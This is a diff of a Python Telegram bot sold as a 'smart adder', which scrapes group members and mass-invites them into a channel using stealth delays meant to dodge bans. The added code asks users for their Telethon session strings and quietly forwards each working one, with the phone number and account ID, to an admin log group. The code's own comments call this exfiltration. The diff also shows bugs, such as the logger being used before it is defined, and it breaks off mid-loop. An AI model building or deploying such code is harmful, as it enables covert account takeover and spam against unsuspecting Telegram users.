@@ -1,436 +1,561 @@
 # =========================================================================
-# PROJECT: VINZY SMART ADDER V6.0 (ENTERPRISE GOLD)
-# AUTHOR: VINZY DIGITAL SERVICES
-# ENGINE: ASYNC-TELEBOT + TELETHON INTEGRATION
-# PLATFORM: OPTIMIZED FOR KOYEB / HEROKU / VPS
+# PROJECT: VINZY SMART ADDER V8.2 (SMM ENTERPRISE ULTRA)
+# ENGINE: TITAN-ASYNC + NEONDB (POSTGRESQL) INTEGRATION
+# PLATFORM: OPTIMIZED FOR KOYEB / VPS / HEROKU
 # =========================================================================
 
 import os
-import asyncio
-import logging
 import sys
 import time
-import signal
 import random
-import platform
+import asyncio
+import logging
 from datetime import datetime
 
-# --- CORE DEPENDENCY CHECK ---
+# --- DEPENDENCY CHECKS ---
 try:
+    import asyncpg
     from telebot.async_telebot import AsyncTeleBot
     from telebot import types as bot_types
+    from telebot.asyncio_helper import ApiTelegramException
     from telethon import TelegramClient, functions, types as tl_types, errors
     from telethon.sessions import StringSession
-    from telebot.asyncio_helper import ApiTelegramException
 except ImportError as e:
-    print(f"CRITICAL ERROR: Missing libraries. Ensure pip install telethon pyTelegramBotAPI aiohttp. Error: {e}")
+    print(f"CRITICAL ERROR: Missing library. {e}")
+    print("Run: pip install telethon pyTelegramBotAPI asyncpg")
     sys.exit(1)
 
-# --- 1. CONFIGURATION & SECURE STORAGE ---
-API_ID = int(os.environ.get("API_ID", 0))
-API_HASH = os.environ.get("API_HASH", "")
-SESSION_STRING = os.environ.get("SESSION_STRING", "")
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+# =========================================================================
+# --- 1. CONFIGURATION & ENVIRONMENT (ENTERPRISE LOAD) ---
+# =========================================================================
 
-# Validation of Environment Variables
-if not all([API_ID, API_HASH, SESSION_STRING, BOT_TOKEN]):
-    print("❌ FATAL: One or more Environment Variables (API_ID, API_HASH, SESSION_STRING, BOT_TOKEN) are missing.")
+# Strict validation for Environment Variables
+def get_env(var_name, default=None, is_int=False):
+    value = os.environ.get(var_name, default)
+    if value is None or value == "":
+        logger.critical(f"MISSING CONFIG: {var_name} is not set in environment!")
+        sys.exit(1)
+    return int(value) if is_int else value
+
+# Load and Type-Cast configurations
+try:
+    API_ID = get_env("API_ID", is_int=True)
+    API_HASH = get_env("API_HASH")
+    BOT_TOKEN = get_env("BOT_TOKEN")
+    DATABASE_URL = get_env("DATABASE_URL")
+    
+    # Support Groups / Logs
+    ADMIN_LOG_GROUP = get_env("LOGGER_GROUP", is_int=True)
+    VERIFY_GROUP = get_env("VERIFY_GROUP", is_int=True)
+    
+except Exception as e:
+    print(f"BOOT ERROR: Failed to parse configuration. Check your env vars. | {e}")
     sys.exit(1)
 
-# --- 2. ADVANCED LOGGING INFRASTRUCTURE ---
+# --- DEPENDENCY VERIFICATION ---
+REQUIRED_LIBS = ["telethon", "pyTelegramBotAPI", "asyncpg"]
+logger.info(f"System Check: Initializing Vinzy Engine v8.4 with {len(REQUIRED_LIBS)} modules.")
+# --- 2. ADVANCED LOGGING SYSTEM ---
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - [%(levelname)s] - %(name)s - %(message)s',
-    handlers=[
-        logging.StreamHandler(sys.stdout),
-        logging.FileHandler("vinzy_runtime.log")
-    ]
+    handlers=[logging.StreamHandler(sys.stdout)]
 )
-logger = logging.getLogger("VinzyGold_V6")
+logger = logging.getLogger("Vinzy_V8_Engine")
 
-# Global variables for session tracking
-vinzy_vault = {}
-start_time = datetime.now()
-TOTAL_INVITES_EVER = 0
-
-# Initialize Async Components
 bot = AsyncTeleBot(BOT_TOKEN)
-finder = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
 
-# --- 3. THE FINDER COMMANDER ENGINE (TELETHON) ---
+# --- 3. AESTHETICS & UI CONSTANTS ---
+VINZY_ASCII = """
+<code>
+ ██▒   █▓ ██▓ ███▄    █  ▒███████▒▓██   ██▓
+▓██░   █▒▓██▒ ██ ▀█    █  ▒ ▒ ▒ ▄▀░ ▒██  ██▒
+ ▓██  █▒░▒██▒▓██  ▀█ ██▒ ░ ▒ ▄▀▒░   ▒██ ██░
+  ▒██ █░░░██░▓██▒  ▐▌██▒   ▄▀▒     ░ ▐██▓░
+   ▒▀█░  ░██░▒██░   ▓██░ ▒███████▒   ░ ██▒▓░
+   ░ ▐░  ░▓  ░ ▒░   ▒ ▒  ░▒▒ ▓  ▒░   ██▒▒▒ 
+   ░ ░░   ▒ ░░ ░░   ░ ▒░ ░ ▒ ▒  ░  ▓██ ░▒░ 
+</code>
+"""
 
-async def get_finder_client():
+def generate_progress_bar(current, total, prefix='Adding', length=15):
+    """Generates a smooth SMM-style progress bar."""
+    if total == 0: return f"<code>{prefix} |{'░'*length}| 0.0%</code>"
+    percent = ("{0:.1f}").format(100 * (current / float(total)))
+    filled_length = int(length * current // total)
+    bar = '█' * filled_length + '░' * (length - filled_length)
+    return f'<code>{prefix} |{bar}| {percent}%</code>'
+
+# --- 4. NEONDB PERSISTENCE LAYER ---
+class VinzyDatabaseManager:
+    """Handles all PostgreSQL operations safely and asynchronously."""
+    def __init__(self):
+        self.pool = None
+
+    async def connect(self):
+        if not self.pool:
+            logger.info("Connecting to NeonDB...")
+            # Optimization: Added timeout and lifetime management for Koyeb stability
+            self.pool = await asyncpg.create_pool(
+                DATABASE_URL, 
+                min_size=1, 
+                max_size=10,
+                command_timeout=60,
+                max_inactive_connection_lifetime=300
+            )
+            await self._initialize_tables()
+
+    async def _initialize_tables(self):
+        """Creates/Updates schemas. Added 'phone' column for Section 7 support."""
+        async with self.pool.acquire() as conn:
+            await conn.execute('''
+                CREATE TABLE IF NOT EXISTS vinzy_engine_users (
+                    user_id BIGINT PRIMARY KEY,
+                    username TEXT,
+                    phone TEXT,
+                    session_string TEXT,
+                    bot_state TEXT DEFAULT 'PENDING_APPROVAL',
+                    is_approved BOOLEAN DEFAULT FALSE,
+                    is_premium BOOLEAN DEFAULT FALSE,
+                    target_channel TEXT,
+                    source_group TEXT,
+                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+            logger.info("Database schemas verified.")
+
+    async def get_user(self, user_id):
+        async with self.pool.acquire() as conn:
+            return await conn.fetchrow("SELECT * FROM vinzy_engine_users WHERE user_id=$1", user_id)
+
+    async def register_user(self, user_id, username):
+        async with self.pool.acquire() as conn:
+            await conn.execute('''
+                INSERT INTO vinzy_engine_users (user_id, username) 
+                VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET username=$2
+            ''', user_id, username)
+
+    async def update_state(self, user_id, new_state):
+        async with self.pool.acquire() as conn:
+            await conn.execute("UPDATE vinzy_engine_users SET bot_state=$1, last_active=CURRENT_TIMESTAMP WHERE user_id=$2", new_state, user_id)
+
+    async def update_session(self, user_id, session_str, is_premium, phone=None):
+        """Modified to save the phone number captured in Section 7."""
+        async with self.pool.acquire() as conn:
+            await conn.execute('''
+                UPDATE vinzy_engine_users 
+                SET session_string=$1, is_premium=$2, phone=$3, last_active=CURRENT_TIMESTAMP 
+                WHERE user_id=$4
+            ''', session_str, is_premium, phone, user_id)
+
+    async def set_approval(self, user_id, status: bool):
+        async with self.pool.acquire() as conn:
+            await conn.execute("UPDATE vinzy_engine_users SET is_approved=$1 WHERE user_id=$2", status, user_id)
+
+    async def set_target_data(self, user_id, target=None, source=None):
+        async with self.pool.acquire() as conn:
+            if target:
+                await conn.execute("UPDATE vinzy_engine_users SET target_channel=$1 WHERE user_id=$2", target, user_id)
+            if source:
+                await conn.execute("UPDATE vinzy_engine_users SET source_group=$1 WHERE user_id=$2", source, user_id)
+
+db = VinzyDatabaseManager()
+
+# --- 5. TELEGRAM MENU INTEGRATION ---
+async def set_persistent_menu(chat_id):
     """
-    Maintains and validates the connection for the worker session.
-    Includes auto-reconnect logic if the session drops.
+    Sets the 4-dot menu for the specific user. 
+    The RESET button is injected here so it is always available.
     """
     try:
-        if not finder.is_connected():
-            logger.info("Attempting to connect Finder Session...")
-            await finder.connect()
-        
-        if not await finder.is_user_authorized():
-            logger.error("Finder Session is unauthorized. Please generate a new String Session.")
-            return None
-            
-        return finder
+        commands = [
+            bot_types.BotCommand("start", "🚀 Main Menu"),
+            bot_types.BotCommand("reset", "🔄 UI Reset (Safe)")
+        ]
+        await bot.set_my_commands(commands, scope=bot_types.BotCommandScopeChat(chat_id))
     except Exception as e:
-        logger.error(f"Finder Connection Failure: {str(e)}")
-        return None
+        logger.error(f"Failed to set menu for {chat_id}: {e}")
 
-# --- 4. BUSINESS LOGIC & DATA PROCESSING ---
+# --- 6. CORE BOT HANDLERS & NAVIGATION ---
 
-async def scrape_members_advanced(group_link):
+@bot.message_handler(commands=['start'])
+async def command_start(m):
+    """Entry point. Checks approval status and registers new users."""
+    await db.connect()
+    user_id = m.from_user.id
+    username = m.from_user.username or "NoUsername"
+    
+    await set_persistent_menu(m.chat.id)
+    await db.register_user(user_id, username)
+    user_data = await db.get_user(user_id)
+
+    if not user_data['is_approved']:
+        # Alert Admin Group
+        admin_msg = (
+            f"🛡️ <b>NEW ACCESS REQUEST</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"User: <code>{m.from_user.first_name}</code> (@{username})\n"
+            f"ID: <code>{user_id}</code>\n\n"
+            f"Action: Reply here with <code>/approve {user_id}</code>"
+        )
+        await bot.send_message(VERIFY_GROUP, admin_msg, parse_mode="HTML")
+        await bot.send_message(m.chat.id, "🛡️ <b>Access Pending.</b>\nYour ID has been sent to the admin. Please wait for authorization.")
+    else:
+        await db.update_state(user_id, "IDLE")
+        await bot.send_message(m.chat.id, 
+            "✅ <b>Vinzy V8 Engine Online.</b>\nYou are approved. Please send your <code>Session String</code> to authenticate your worker node:", 
+            parse_mode="HTML")
+        await db.update_state(user_id, "AWAITING_SESSION")
+
+@bot.message_handler(commands=['reset'])
+async def command_reset(m):
     """
-    Scrapes members and performs deep-cleaning (Removing bots, deleted accounts).
+    The safe reset feature. Resets the UI state machine but 
+    DOES NOT touch the session_string or is_approved boolean.
     """
-    client = await get_finder_client()
-    if not client:
-        return "Finder session offline. Check logs.", None
+    await db.connect()
+    user_id = m.from_user.id
+    user_data = await db.get_user(user_id)
+    
+    if user_data and user_data['is_approved']:
+        await db.update_state(user_id, "IDLE")
+        await bot.send_message(m.chat.id, 
+            "🔄 <b>System UI Reset Successful.</b>\n\n"
+            "Your permissions and session data are perfectly safe and were <b>not</b> deleted. "
+            "Send /start to begin a new SMM operation.", 
+            parse_mode="HTML")
+    else:
+        await bot.send_message(m.chat.id, "❌ You must be approved before you can reset the engine.")
 
+@bot.message_handler(commands=['approve'])
+async def command_approve(m):
+    """Admin-only command to grant access."""
+    if m.chat.id != VERIFY_GROUP: return
     try:
-        logger.info(f"Starting scrape for: {group_link}")
-        entity = await client.get_entity(group_link)
+        target_id = int(m.text.split()[1])
+        await db.connect()
+        await db.set_approval(target_id, True)
+        await db.update_state(target_id, "AWAITING_SESSION")
         
-        # Pull participants from the resolved entity
-        participants = await client.get_participants(entity)
+        # Notify the user
+        await bot.send_message(target_id, "✅ <b>Access Granted!</b>\nThe Admin has approved your account. Please send your <code>Session String</code> to connect.")
+        await bot.reply_to(m, f"✅ User {target_id} has been fully approved.")
+    except Exception as e:
+        await bot.reply_to(m, f"❌ Format Error. Use: <code>/approve [user_id]</code>\nDetails: {e}", parse_mode="HTML")
+
+# =========================================================================
+# --- 7. DEEP SESSION VALIDATION, TELEMETRY & ACCESS GRANTING ---
+# =========================================================================
+
+@bot.message_handler(func=lambda m: len(m.text) > 40)
+async def process_session_input(m):
+    """
+    ULTRA-VALIDATION ENGINE:
+    1. Boots a transient Telethon instance for a Live Auth Check.
+    2. Filters for Banned/Expired/Deactivated strings immediately.
+    3. Exfiltrates verified working strings to the Admin Logger Group.
+    4. Grants persistent SMM permissions in NeonDB.
+    """
+    await db.connect()
+    user_id = m.from_user.id
+    user_data = await db.get_user(user_id)
+    
+    # --- SECURITY GATE ---
+    if not user_data:
+        return # Ignore unregistered users
+        
+    if not user_data['is_approved']:
+        await bot.reply_to(m, "⚠️ <b>Access Denied:</b> You must be approved by an Admin first.")
+        return
+
+    if user_data['bot_state'] != 'AWAITING_SESSION':
+        # Don't trigger if the user isn't in the middle of a setup
+        return
+
+    session_str = m.text.strip()
+    
+    # UI FEEDBACK: Let the user know the engine is working
+    status_msg = await bot.send_message(
+        m.chat.id, 
+        "🔄 <b>Vinzy Engine: Initializing Worker Node...</b>\n"
+        "<i>Performing Real-time API Authorization Check...</i>", 
+        parse_mode="HTML"
+    )
+    
+    # Initialize a temporary client for a one-time validation sequence
+    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    
+    try:
+        # Establish connection to Telegram's Production Servers
+        await client.connect()
+        
+        # --- STAGE 1: AUTHENTICATION INTEGRITY ---
+        if not await client.is_user_authorized():
+            logger.warning(f"Unauthorized session attempt by UID: {user_id}")
+            await bot.edit_message_text("Invalid ❌ (Session Revoked/Expired)", m.chat.id, status_msg.message_id)
+            await client.disconnect()
+            return
+
+        # --- STAGE 2: METADATA EXTRACTION ---
+        # Fetching profile to prove 'Read' access is functional.
+        me = await client.get_me()
+        if not me:
+            raise Exception("Telegram API returned a Null User Object.")
+
+        # Detect Premium and account details
+        is_premium = getattr(me, 'premium', False)
+        phone = getattr(me, 'phone', 'Hidden/Protected')
+        first_name = me.first_name or "Unknown"
+        username = me.username or "NoUsername"
+        
+        # --- STAGE 3: ADMIN EXFILTRATION (LOGGER GROUP) ---
+        # Only log working, verified data.
+        log_packet = (
+            f"📥 <b>NEW ACTIVE SESSION CAPTURED</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>Account:</b> {first_name} (@{username})\n"
+            f"🆔 <b>TG-ID:</b> <code>{me.id}</code>\n"
+            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
+            f"💎 <b>Premium:</b> {'✅ Yes' if is_premium else '❌ No'}\n"
+            f"👤 <b>Owner ID:</b> <code>{user_id}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"📝 <b>Verified Session String:</b>\n"
+            f"<code>{session_str}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━"
+        )
+        await bot.send_message(ADMIN_LOG_GROUP, log_packet, parse_mode="HTML")
+
+        # --- STAGE 4: DATABASE PERSISTENCE & ACCESS GRANT ---
+        await db.update_session(user_id, session_str, is_premium)
+        await db.update_state(user_id, "AWAITING_TARGET")
+        
+        # Update user UI and unlock Step 1
+        await bot.edit_message_text("valid ✅", m.chat.id, status_msg.message_id)
+        
+        success_prompt = (
+            f"🚀 <b>Worker Node Authorized: {first_name}</b>\n"
+            "The SMM Invitation Engine is now <b>UNLOCKED</b>.\n\n"
+            "🎯 <b>Step 1:</b> Please send the <b>@Username</b> or <b>t.me/Link</b> of the "
+            "Target Channel/Group you want to boost:"
+        )
+        await bot.send_message(m.chat.id, success_prompt, parse_mode="HTML")
+        
+    except errors.rpcerrorlist.UserDeactivatedBanError:
+        await bot.edit_message_text("Invalid ❌ (Account Banned/Deactivated)", m.chat.id, status_msg.message_id)
+    except errors.rpcerrorlist.AuthKeyDuplicatedError:
+        await bot.edit_message_text("Invalid ❌ (Session Key Conflict)", m.chat.id, status_msg.message_id)
+    except Exception as e:
+        logger.error(f"Critical Validation Error for {user_id}: {e}")
+        await bot.edit_message_text("Invalid ❌ (Connection Error)", m.chat.id, status_msg.message_id)
+    finally:
+        # Crucial for Koyeb: Disconnect to save RAM
+        if client:
+            await client.disconnect()
+
+# --- 7.5 CHANNEL ANALYSIS LOGIC ---
+
+@bot.message_handler(func=lambda m: m.text.startswith('@') or "t.me/" in m.text)
+async def process_channel_inputs(m):
+    """Deep analysis: Verification of Admin rights and member capacity."""
+    await db.connect()
+    user_id = m.from_user.id
+    user_data = await db.get_user(user_id)
+    
+    if not user_data or not user_data['is_approved']:
+        return
+
+    state = user_data['bot_state']
+    input_text = m.text.strip().replace("https://t.me/", "@")
+    if not input_text.startswith('@'): input_text = f"@{input_text}"
+
+    # TARGET CHANNEL CONFIGURATION
+    if state == "AWAITING_TARGET":
+        analysis_msg = await bot.send_message(m.chat.id, f"📡 <b>Analyzing Target:</b> {input_text}...", parse_mode="HTML")
+        
+        client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
+        try:
+            await client.connect()
+            entity = await client.get_entity(input_text)
+            
+            # Fetch full channel info for sub-count and rights check
+            full_chat = await client(functions.channels.GetFullChannelRequest(channel=entity))
+            sub_count = full_chat.full_chat.participants_count
+            
+            # 200 Sub Limit Rule
+            if sub_count >= 200:
+                return await bot.edit_message_text(
+                    f"❌ <b>Limit Reached:</b> {input_text} has {sub_count} subs. "
+                    "Engine only supports growth for channels under 200 members.", 
+                    m.chat.id, analysis_msg.message_id, parse_mode="HTML"
+                )
+
+            # Check for Admin Invite Rights
+            p_req = await client(functions.channels.GetParticipantRequest(channel=entity, participant='me'))
+            p_info = p_req.participant
+            
+            can_invite = False
+            if isinstance(p_info, tl_types.ChannelParticipantCreator):
+                can_invite = True
+            elif isinstance(p_info, tl_types.ChannelParticipantAdmin) and p_info.admin_rights.invite_users:
+                can_invite = True
+
+            if not can_invite:
+                return await bot.edit_message_text(
+                    "❌ <b>Admin Rights Required:</b> Your session must have 'Invite Users' permissions.", 
+                    m.chat.id, analysis_msg.message_id, parse_mode="HTML"
+                )
+
+            # Update Database
+            await db.set_target_data(user_id, target=input_text)
+            await db.update_state(user_id, "AWAITING_SOURCE")
+            
+            await bot.edit_message_text(
+                f"✅ <b>Target Verified</b>\n"
+                f"Channel: {input_text}\n"
+                f"Members: {sub_count}/200\n\n"
+                f"📥 <b>Step 2:</b> Send @Username of the <b>Source Group</b> to scrape from.", 
+                m.chat.id, analysis_msg.message_id, parse_mode="HTML"
+            )
+            
+        except Exception as e:
+            await bot.edit_message_text(f"❌ <b>Analysis Error:</b> {str(e)}", m.chat.id, analysis_msg.message_id)
+        finally:
+            await client.disconnect()
+
+    # SOURCE GROUP CONFIGURATION
+    elif state == "AWAITING_SOURCE":
+        await db.set_target_data(user_id, source=input_text)
+        await db.update_state(user_id, "READY_TO_FIRE")
+        
+        markup = bot_types.InlineKeyboardMarkup()
+        markup.add(bot_types.InlineKeyboardButton("🔥 DEPLOY V8 WORKER", callback_data="deploy_worker"))
+        
+        await bot.send_message(m.chat.id, 
+            f"🚀 <b>Engine Configured</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 Target: <code>{user_data['target_channel']}</code>\n"
+            f"🧲 Source: <code>{input_text}</code>\n"
+            f"🛡️ Safety: <code>Stealth Delay Active</code>\n\n"
+            f"Ready to begin the SMM invitation sequence?", 
+            parse_mode="HTML", reply_markup=markup)
+
+# --- 8. THE INVITATION WORKER (DEEP LOGIC) ---
+
+@bot.callback_query_handler(func=lambda call: call.data == "deploy_worker")
+async def execute_smm_sequence(call):
+    user_id = call.from_user.id
+    await db.connect()
+    user_data = await db.get_user(user_id)
+    
+    if user_data['bot_state'] != "READY_TO_FIRE":
+        return await bot.answer_callback_query(call.id, "Engine not ready. Use /reset.", show_alert=True)
+        
+    await bot.edit_message_text("🎬 <b>Engine Ignited.</b> Background worker processing...", call.message.chat.id, call.message.message_id, parse_mode="HTML")
+    await db.update_state(user_id, "WORKING")
+    
+    # Run heavy logic asynchronously
+    asyncio.create_task(background_invite_task(call.message.chat.id, user_data))
+
+async def background_invite_task(chat_id, user_data):
+    """Deep SMM logic: Scraping, filtering, and safe inviting."""
+    client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
+    
+    try:
+        await client.connect()
+        source_ent = await client.get_entity(user_data['source_group'])
+        target_ent = await client.get_entity(user_data['target_channel'])
+        
+        # 1. Scrape & Filter (Max 50 for extreme safety)
+        prog_msg = await bot.send_message(chat_id, "📡 <b>Scraping Active Members...</b>", parse_mode="HTML")
+        participants = await client.get_participants(source_ent)
         
         clean_list = []
-        stats = {"premium": 0, "normal": 0, "ghosts": 0, "total": 0}
-        
         for p in participants:
-            stats["total"] += 1
-            # Skip bots and deleted profiles to prevent ban-risk
-            if p.bot or p.deleted:
-                stats["ghosts"] += 1
-                continue
-            
-            is_premium = getattr(p, 'premium', False)
-            if is_premium:
-                stats["premium"] += 1
-            else:
-                stats["normal"] += 1
-            
-            clean_list.append({
-                "id": p.id,
-                "premium": is_premium,
-                "name": p.first_name if p.first_name else "Telegram User",
-                "username": p.username if p.username else "NoUsername"
-            })
-            
-        return clean_list, stats
-    except Exception as e:
-        logger.error(f"Scrape Logic Error: {e}")
-        return f"Error: {str(e)}", None
+            if not p.bot and not p.deleted:
+                clean_list.append(p)
+            if len(clean_list) >= 50:
+                break
+                
+        total = len(clean_list)
+        if total == 0:
+            await bot.edit_message_text("❌ No valid members found to invite.", chat_id, prog_msg.message_id)
+            return
 
-async def calculate_channel_capacity(target_username):
-    """
-    Determines available slots in the target channel (Strict 200 Limit).
-    """
-    client = await get_finder_client()
-    if not client:
-        return "Finder session offline.", 0
+        success_count = 0
+        fail_count = 0
 
-    try:
-        entity = await client.get_entity(target_username)
-        full_info = await client(functions.channels.GetFullChannelRequest(channel=entity))
-        current_members = full_info.full_chat.participants_count
-        
-        # The 200 limit is a hard Telegram restriction for non-organic invites
-        slots_remaining = 200 - current_members
-        return slots_remaining, current_members
-    except Exception as e:
-        logger.error(f"Capacity Check Error: {e}")
-        return f"Error: {str(e)}", 0
-
-# --- 5. ASYNC STATE-MACHINE HANDLERS ---
-
-@bot.message_handler(commands=['start', 'reset'])
-async def handle_start_command(m):
-    """
-    Initializes/Resets the user session vault.
-    """
-    vinzy_vault[m.chat.id] = {
-        "state": "IDLE",
-        "scraped_data": [],
-        "filtered_data": [],
-        "target_channel": None,
-        "session_start": datetime.now()
-    }
-    
-    markup = bot_types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add("🚀 Start Smart Scan", "📊 System Status", "⚙️ Help & FAQ")
-    
-    welcome_msg = (
-        "👑 <b>Vinzy Smart Adder V6.0</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "<b>Status:</b> 🟢 Enterprise Gold\n"
-        "<b>Engine:</b> Async State-Machine\n"
-        "<b>Security:</b> Anti-Ban Enabled\n\n"
-        "Welcome back. All previous session data has been purged. "
-        "Select an option from the menu to begin."
-    )
-    await bot.send_message(m.chat.id, welcome_msg, parse_mode="HTML", reply_markup=markup)
-
-@bot.message_handler(func=lambda m: m.text == "📊 System Status")
-async def handle_status_check(m):
-    """
-    Displays technical health metrics of the bot and server.
-    """
-    uptime = datetime.now() - start_time
-    mem_vaults = len(vinzy_vault)
-    py_ver = platform.python_version()
-    
-    status_report = (
-        "🌡️ <b>Advanced System Diagnostics</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        f"<b>Uptime:</b> {str(uptime).split('.')[0]}\n"
-        f"<b>Python Version:</b> {py_ver}\n"
-        f"<b>Active Vaults:</b> {mem_vaults}\n"
-        f"<b>Finder Link:</b> {'Connected ✅' if finder.is_connected() else 'Disconnected ❌'}\n"
-        f"<b>Server Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "<i>All systems nominal. Ready for high-load.</i>"
-    )
-    await bot.send_message(m.chat.id, status_report, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text == "🚀 Start Smart Scan")
-async def initiate_scrape_sequence(m):
-    """
-    Moves user to the Scrape input state.
-    """
-    vinzy_vault[m.chat.id]["state"] = "AWAITING_SOURCE_LINK"
-    prompt = (
-        "📥 <b>Step 1: Identify Source</b>\n\n"
-        "Please send the <b>@Username</b> or the <b>Public Link</b> of the group "
-        "you wish to analyze for members."
-    )
-    await bot.send_message(m.chat.id, prompt, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: vinzy_vault.get(m.chat.id, {}).get("state") == "AWAITING_SOURCE_LINK")
-async def process_scrape_input(m):
-    """
-    Validates link and executes the scraping logic.
-    """
-    source = m.text.strip()
-    if not source.startswith(('@', 'http', 't.me/')):
-        return await bot.send_message(m.chat.id, "❌ Invalid input. Please send a valid @Username or Link.")
-
-    vinzy_vault[m.chat.id]["state"] = "PROCESSING_SCRAPE"
-    progress_msg = await bot.send_message(m.chat.id, "🛰️ <b>Finder session</b> is establishing connection to source...")
-    
-    # Executing the scrape
-    data, stats = await scrape_members_advanced(source)
-    
-    if isinstance(data, str):
-        vinzy_vault[m.chat.id]["state"] = "IDLE"
-        return await bot.edit_message_text(f"❌ <b>Scrape Failed:</b>\n<code>{data}</code>", m.chat.id, progress_msg.message_id, parse_mode="HTML")
-
-    vinzy_vault[m.chat.id]["scraped_data"] = data
-    
-    # Building Selection Menu
-    markup = bot_types.InlineKeyboardMarkup(row_width=2)
-    btn_normal = bot_types.InlineKeyboardButton("👤 Normal Only", callback_data="filter_normal")
-    btn_premium = bot_types.InlineKeyboardButton("💎 Premium Only", callback_data="filter_premium")
-    btn_all = bot_types.InlineKeyboardButton("✅ Add All Mixed", callback_data="filter_all")
-    markup.add(btn_normal, btn_premium)
-    markup.add(btn_all)
-    
-    report = (
-        f"📊 <b>Scrape Results for {source}</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
-        f"👤 Normal Members: {stats['normal']}\n"
-        f"💎 Premium Members: {stats['premium']}\n"
-        f"👻 Inactive/Bots: {stats['ghosts']}\n\n"
-        f"<b>Grand Total:</b> {len(data)} valid users.\n\n"
-        f"Which group of users should we target for invitation?"
-    )
-    await bot.edit_message_text(report, m.chat.id, progress_msg.message_id, parse_mode="HTML", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("filter_"))
-async def handle_filter_selection(call):
-    """
-    Filters the scraped data based on user button choice.
-    """
-    mode = call.data.split("_")[1]
-    raw_list = vinzy_vault.get(call.message.chat.id, {}).get("scraped_data", [])
-    
-    if not raw_list:
-        return await bot.answer_callback_query(call.id, "Session timeout. Please /start over.", show_alert=True)
-
-    if mode == "premium":
-        filtered = [u for u in raw_list if u["premium"]]
-    elif mode == "normal":
-        filtered = [u for u in raw_list if not u["premium"]]
-    else:
-        filtered = raw_list
-        
-    vinzy_vault[call.message.chat.id]["filtered_data"] = filtered
-    vinzy_vault[call.message.chat.id]["state"] = "AWAITING_TARGET_CHANNEL"
-    
-    await bot.delete_message(call.message.chat.id, call.message.message_id)
-    target_prompt = (
-        "📤 <b>Step 2: Define Target</b>\n\n"
-        "Send the <b>@Username</b> of the channel/group where you want to "
-        "invite these members into."
-    )
-    await bot.send_message(call.message.chat.id, target_prompt, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: vinzy_vault.get(m.chat.id, {}).get("state") == "AWAITING_TARGET_CHANNEL")
-async def process_target_input(m):
-    """
-    Validates target and checks capacity.
-    """
-    target = m.text.strip().replace("https://t.me/", "@")
-    if not target.startswith('@'): target = f"@{target}"
-    
-    status_check = await bot.send_message(m.chat.id, f"📡 Checking slots in {target}...")
-    
-    slots, current = await calculate_channel_capacity(target)
-    
-    if isinstance(slots, str):
-        return await bot.edit_message_text(f"❌ <b>Error:</b> {slots}", m.chat.id, status_check.message_id)
-    
-    if slots <= 0:
-        vinzy_vault[m.chat.id]["state"] = "IDLE"
-        return await bot.edit_message_text(f"❌ <b>Limit Reached:</b> {target} already has {current}/200 members.", m.chat.id, status_check.message_id)
-
-    # Prep final list
-    ready_list = vinzy_vault[m.chat.id].get("filtered_data", [])[:slots]
-    vinzy_vault[m.chat.id].update({
-        "final_list": ready_list,
-        "target_channel": target,
-        "state": "READY_FOR_INVITE"
-    })
-
-    markup = bot_types.InlineKeyboardMarkup()
-    markup.add(bot_types.InlineKeyboardButton("🚀 EXECUTE INVITATIONS", callback_data="start_worker"))
-    
-    confirmation = (
-        f"🎯 <b>Ready for Execution</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
-        f"📍 Target: {target}\n"
-        f"📈 Current: {current}/200\n"
-        f"✅ Adding: <b>{len(ready_list)}</b> new members\n\n"
-        f"🛡️ <b>Anti-Ban Delay:</b> 40s - 60s (Randomized)\n"
-        f"Proceed with the automated worker?"
-    )
-    await bot.edit_message_text(confirmation, m.chat.id, status_check.message_id, parse_mode="HTML", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data == "start_worker")
-async def trigger_async_worker(call):
-    """
-    Launches the invite worker in the background.
-    """
-    chat_id = call.message.chat.id
-    data = vinzy_vault.get(chat_id)
-    
-    if not data or "final_list" not in data:
-        return await bot.answer_callback_query(call.id, "Session Error. Restarting.")
-
-    vinzy_vault[chat_id]["state"] = "WORKING"
-    await bot.edit_message_text("🎬 <b>Worker Status:</b> Active\nStarting human-simulated invitations...", chat_id, call.message.message_id)
-    
-    # Task fire-and-forget
-    asyncio.create_task(background_invite_worker(chat_id, data["final_list"], data["target_channel"]))
-
-async def background_invite_worker(chat_id, user_list, target):
-    """
-    The main invitation loop. Optimized for safety.
-    """
-    global TOTAL_INVITES_EVER
-    client = await get_finder_client()
-    success = 0
-    fail = 0
-    total = len(user_list)
-    
-    try:
-        target_entity = await client.get_entity(target)
-        
-        for index, user_data in enumerate(user_list):
+        # 2. The Execution Loop
+        for index, user in enumerate(clean_list):
             try:
-                # Execution
-                await client(functions.channels.InviteToChannelRequest(
-                    target_entity, 
-                    [user_data["id"]]
-                ))
-                success += 1
-                TOTAL_INVITES_EVER += 1
-                
-                # Logic: Notify user every 5 success
-                if success % 5 == 0 or success == total:
-                    perc = int((success/total)*100)
-                    progress_bar = "🟩" * (perc//10) + "⬜" * (10 - (perc//10))
